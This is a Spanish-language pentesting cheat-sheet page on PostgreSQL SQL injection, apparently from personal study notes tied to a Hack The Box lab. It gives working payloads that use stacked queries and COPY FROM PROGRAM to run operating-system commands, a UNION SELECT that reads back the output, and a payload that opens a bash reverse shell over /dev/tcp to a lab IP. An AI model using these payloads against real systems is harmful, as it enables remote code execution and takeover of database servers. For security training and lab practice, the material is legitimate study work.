# SQLI

## ERROR BASED

### POSTGRESQL

#### Ejecución remota de comandos

Con postgresql podemos realizar comandos dentro de la máquina objetivo y sacar el output o directamente establecernos una Reverse Shell.

En primer lugar creamos una tabla que será donde copiemos el output del comando que queramos usar, en este caso "whoami"

```
HOLA' ; DROP TABLE IF EXISTS prueba; CREATE TABLE prueba(data text); COPY prueba FROM PROGRAM 'whoami';--
```

Para ver dicho output lo que tendríamos que hacer es mostrar los datos dentro de la tabla prueba que hemos creado, el siguiente ejemplo es sacado del formulario de búsqueda de la máquina [Vaccine ](../../../write-up/vaccine.md)de Hack The Box:

```
HOLA' UNION SELECT NULL,NULL,NULL,*,NULL FROM prueba--
```

También podríamos sacar una reverse Shell directamente, tenemos que plantear que estamos realizando una ejecución de comandos y viendo el output, pero el comando se está ejecutando por lo que podemos hacer pruebas con las distintas formas de enviar una [reverse shell](../../../herramientas/shell-cheatsheet.md)

```
HOLA' ; DROP TABLE IF EXISTS prueba; CREATE TABLE prueba(data text); COPY prueba FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.10.10/443 0>&1"';--
```

Más info en [https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)



> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
